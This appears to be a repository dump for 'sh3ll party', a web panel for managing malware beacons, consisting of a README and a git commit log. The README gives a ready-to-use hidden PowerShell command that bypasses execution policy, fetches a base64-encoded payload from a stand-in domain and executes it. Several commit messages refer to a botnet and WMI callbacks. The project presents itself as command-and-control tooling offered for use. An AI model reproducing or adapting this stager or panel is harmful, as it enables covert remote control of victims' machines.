@@ -1,0 +1,113 @@
+======================: FILES :======================
+======================: README CONTENT :======================
+sh3ll party
+-----------
+I had malware that called back at specified intervals via http but no frontend to manage it. This is what I came up with.
+
+Callback script: `powershell -w hidden -ep bypass -nop -c "$i=(New-Object Net.WebClient);$i.Headers.add('hostid',[net.dns]::GetHostByName('').HostName);IEX([Text.Encoding]::Ascii.GetString([Convert]::FromBase64String($i.DownloadString('http://your.domain.here'))))"`
+
+You have to have a unique beacon id for each beacon. It can be anything. Make it the hostname, ip, mac, whatever.
+Set response manually or upload a file. JQuery based datatables make it pretty. A bunch of shitty javascript makes it functional.
+====================== GIT HISTORY: ======================
+0e612d5 HEAD@{0}: clone: from https://github.com/wumb0/sh3llparty
+commit 0e612d518d6decc295cb20ab4342c838e201ebea
+Author: Jaime Geiger <jaime@grimm-co.com>
+Date:   Thu Apr 11 18:20:39 2019 -0400
+
+    wsgi/nginx
+
+commit 37faf4e1fdc0eb379143de79e4902443622b6157
+Author: Jaime Geiger <jaime@grimm-co.com>
+Date:   Sat Feb 16 12:49:03 2019 -0500
+
+    fix file uploads
+
+commit 798753dc4f7f4a99131719f96cb78750165f9bb6
+Author: Jaime Geiger <jaime@grimm-co.com>
+Date:   Sat Feb 16 12:44:46 2019 -0500
+
+    fix highlighting for real now
+
+commit 607d67532a625c43d0042d442a75aba0167e7e19
+Author: Jaime Geiger <jaime@grimm-co.com>
+Date:   Fri Feb 15 21:21:08 2019 -0500
+
+    add updated config
+
+commit 0edfea53576a98fb4e6d1a701c793924cd630dd6
+Author: Jaime Geiger <jaime@grimm-co.com>
+Date:   Fri Feb 15 21:20:01 2019 -0500
+
+    python3, cfg specified auth, psycopg2, keep selections across table reloads
+
+commit c664ac61de5475be3b2b7f3cb70d24b80f470234
+Author: wumb0 <jaime@grimm-co.com>
+Date:   Sun Jan 27 14:32:25 2019 -0500
+
+    Update README.md
+
+commit 1b9a2e4c181aed05654d1dfff4d65c2299789243
+Author: Jaime Geiger <jaime@grimm-co.com>
+Date:   Mon Feb 12 21:47:27 2018 -0500
+
+    data column number for callback payload was wrong
+
+commit 30d6fd2be1b647b4c5044ff51e50ece0b595c1b0
+Author: Jaime Geiger <jaime@grimm-co.com>
+Date:   Sat Feb 10 21:15:38 2018 -0500
+
+    add ssl support
+
+commit 847a3dd6dfce7a596ca79106b630f64963c6f8a3
+Author: Jaime Geiger <jaime@grimm-co.com>
+Date:   Sat Feb 10 20:58:58 2018 -0500
+
+    updated botnet for bootstrapping
+
+commit 51540ad1c0aa7591289a8a4e09e11af2aee6f023
+Author: wumb0 <wumb0@finishyour.beer>
+Date:   Sat Feb 10 00:23:08 2018 -0500
+
+    Create requirements.txt
+
+commit 773a05bff7f7ec4878da6742c3ca3f780703ab75
+Author: Jaime Geiger <jaime@grimm-co.com>
+Date:   Sun May 7 14:00:34 2017 -0400
+
+    add missing function
+
+commit d9b901831136febff2f954de16f9f7ba862f048e
+Author: Jaime Geiger <jaime@grimm-co.com>
+Date:   Fri May 5 12:53:42 2017 -0400
+
+    fix the cmd for real
+
+commit 2baa22f482c7511ee0734ddfdbc2858215208e58
+Author: Jaime Geiger <jaime@grimm-co.com>
+Date:   Fri May 5 12:53:15 2017 -0400
+
+    fix the cmd
+
+commit 7fa719d76b40135291468ff14397d2770951d5fc
+Author: Jaime Geiger <jaime@grimm-co.com>
+Date:   Fri May 5 12:44:07 2017 -0400
+
+    comments
+
+commit 589717df87465c49146af9da75910d23e6610d96
+Author: Jaime Geiger <jaime@grimm-co.com>
+Date:   Mon May 1 23:14:35 2017 -0400
+
+    added wmi callback
+
+commit 38450930a2eee083c06d98c889d9685bdf6d5c04
+Author: Jaime Geiger <jaime@grimm-co.com>
+Date:   Sun Apr 30 12:29:51 2017 -0400
+
+    redmeh
+
+commit cb234fe954b58b85dee1378160f010e102d7ea10
+Author: Jaime Geiger <jaime@grimm-co.com>
+Date:   Sun Apr 30 12:21:54 2017 -0400
+
+    initial
